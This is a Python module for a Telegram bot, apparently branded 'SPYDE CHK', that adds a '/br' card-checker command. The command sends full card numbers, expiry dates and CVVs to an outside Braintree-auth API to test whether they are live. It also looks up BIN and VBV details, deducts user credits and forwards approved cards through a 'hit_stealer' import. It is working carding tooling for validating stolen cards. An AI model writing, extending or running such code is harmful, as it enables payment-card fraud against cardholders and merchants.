import httpx
import time
import asyncio
import json
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

async def braintree_auth_api_check(fullcc: str, session: httpx.AsyncClient) -> dict:
    url = f"https://miapis.onrender.com/b3_npnbet?lista={fullcc}"
    try:
        resp = await session.get(url)
        json_resp = resp.json()
        status_raw = json_resp.get("Status", "")
        message = json_resp.get("Response", "")
        if status_raw == "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌":
            status = "Declined ❌"
        elif "approved" in status_raw.lower():
            status = "1000: Approved"
        else:
            status = "Unknown Status"
        return {"status": status, "response": message}
    except Exception as e:
        return {"status": "Api Error ⚠️", "response": str(e)}

@Client.on_message(filters.command("br", [".", "/"]))
async def braintree_chk_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)

        gateway = "Braintree Auth"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc == False:
            resp = f"""<b>
Gate Name: {gateway} ♻️
CMD: /br

Message: No CC Found in your input ❌

Usage: /br cc|mes|ano|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        bin6 = cc[:6]

        firstresp = f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()
        session = httpx.AsyncClient(timeout=30, follow_redirects=True)

        result = await braintree_auth_api_check(fullcc, session)

        getbin = await get_bin_details(cc)
        getresp = {"status": result["status"], "response": result["response"]}

        status_top = getresp["status"]
        status_clean = getresp["response"]

        thirdresp = f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""
        currency = getbin[6] if len(getbin) > 6 else "Unknown"

        vbv_status = "Not Found"
        try:
            with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
                vbv_data = file.readlines()
            bin_found = False
            for line in vbv_data:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if parts[0] == bin6:
                    vbv_status = parts[2] if len(parts) > 2 else parts[1]
                    bin_found = True
                    break
            if not bin_found:
                vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
        except FileNotFoundError:
            vbv_status = "VBV BIN file missing"

        proxy_status = "Live ✨"

        elapsed_time = time.perf_counter() - start

        finalresp = f"""
{status_top}
━━━━━━━━━━━━━
[⟐] 𝗖𝗖 - <code>{fullcc}</code>
[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : ⤿ <i>{status_clean}</i> ⤾
[⟐] 𝗚𝗮𝘁𝗲 - {gateway}
━━━━━━━━━━━━━
[⟐] 𝗩𝗕𝗩 - {vbv_status}
━━━━━━━━━━━━━
[⟐] B𝗶𝗻 : {bin6}
[⟐] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[⟐] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}
[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}
━━━━━━━━━━━━━
[⟐] T/t : {elapsed_time:0.2f}s | Proxy : {proxy_status}
[⟐] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
[⟐] 𝗢𝘄𝗻𝗲𝗿: <a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>
╚═══⟐「 𝐒𝐏𝐘𝐃𝐄 𝐂𝐇𝐊  」⟐═════╝
"""
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)

        await setantispamtime(user_id)
        await deductcredit(user_id)
        if status_top == "Approved ✅":
            await sendcc(finalresp, session)

        await session.aclose()

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
